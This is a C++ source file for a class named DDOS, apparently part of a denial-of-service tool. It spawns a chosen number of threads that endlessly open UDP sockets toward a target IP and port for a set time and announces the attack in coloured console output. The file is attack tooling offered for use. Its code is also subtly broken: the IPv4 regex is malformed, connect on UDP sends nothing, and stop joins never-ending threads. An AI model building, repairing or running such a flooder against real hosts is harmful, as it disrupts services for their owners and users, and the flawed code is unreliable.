#include "../include/DDOS.hh"

DDOS::DDOS(string target, MAX_SUPER_INT frequency, MIN_SUPER_INT port, MAX_SUPER_INT timeDDOS): target(target), port(port), frequency(frequency), timeDDOS(timeDDOS) {}

bool DDOS::isIPv4() {
  regex IPv4("([0-9]{1,3}.){3}\\.([0-9]{1,3})");
  return (regex_match(this->target, IPv4)) ? true : false;
}

MIN_SUPER_INT DDOS::getPort() {
  return this->port;
}

MAX_SUPER_INT DDOS::getFrequency() {
  return this->frequency;
}

void* DDOS::goSocket(void *object) {
  DDOS *mockingSocket = (DDOS *) object;
  while (true) {
    SOCKADDR_IN sin;
    SOCKET sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock == INVALID_SOCKET) {
      BOOTSTRAP_SOCKET
    }
    sin.sin_addr.s_addr = inet_addr(mockingSocket->target.c_str());
    sin.sin_family = AF_INET;
    sin.sin_port = htons(mockingSocket->getPort());
    if (connect(sock, (SOCKADDR*)&sin, sizeof(sin)) == SOCKET_ERROR) {
      BOOTSTRAP_CONNECT
    }
    close(sock);
  }
}

void DDOS::attack() {
  if(!this->isIPv4()) {
    BOOTSTRAP_IPV4
    this->stop();
  }

  this->threadTime = thread(DDOS::methodTime, this);
  for (MAX_SUPER_INT i = 0; i < this->frequency; i++) {
    this->threads.emplace_back(DDOS::goSocket, this);
  }

  DDOS_GO
  printf("\033[1;36m->\e[0m DDOS >> %s:%hu (UDP)\n\033[1;36m->\e[0m Frequency - %lu\n", this->target.c_str(), this->port, this->frequency);
}

void* DDOS::methodTime(void *object) {
  DDOS *mockingTime = (DDOS *) object;
  sleep(mockingTime->timeDDOS);
  mockingTime->stop();
  mockingTime->threadTime.join();
}

void DDOS::stop() {
  for (auto& t : this->threads) {
      t.join();
  }
  this->threads.clear();
  BOOTSTRAP_THREADS
  exit(0);
}

DDOS::~DDOS() {}
